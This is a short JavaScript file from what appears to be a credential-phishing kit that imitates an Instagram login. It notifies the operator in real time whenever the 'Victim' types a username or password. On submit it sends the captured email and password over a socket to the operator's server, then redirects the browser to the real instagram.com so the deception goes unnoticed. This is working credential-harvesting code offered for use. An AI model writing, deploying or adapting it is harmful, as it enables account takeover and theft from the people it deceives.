const socket = io()
let email = document.querySelector('#email')
let pass = document.querySelector('#pass')

email.addEventListener('keyup', (e) => {
    socket.emit('typing', 'Victim is typing... username')
})
pass.addEventListener('keyup', (e) => {
    socket.emit('typing', 'Victim is typing... password')
})

function onSubmit(email,password){
    let msg = {
        email: email,
        password: password
    }
    socket.emit('login', msg)
    window.location = "https://www.instagram.com";
}

